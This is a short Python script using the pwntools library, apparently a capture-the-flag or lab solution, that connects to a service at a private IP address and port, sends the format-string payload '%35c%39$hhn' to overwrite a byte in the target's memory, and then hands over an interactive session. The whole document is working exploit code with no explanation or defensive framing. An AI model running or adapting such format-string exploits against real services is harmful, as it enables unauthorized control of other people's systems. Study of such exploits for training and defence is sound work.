from pwn import *
s=remote("192.168.3.253",52000)
payload="%35c%39$hhn"
s.sendafter(b"content: ",payload)
s.interactive()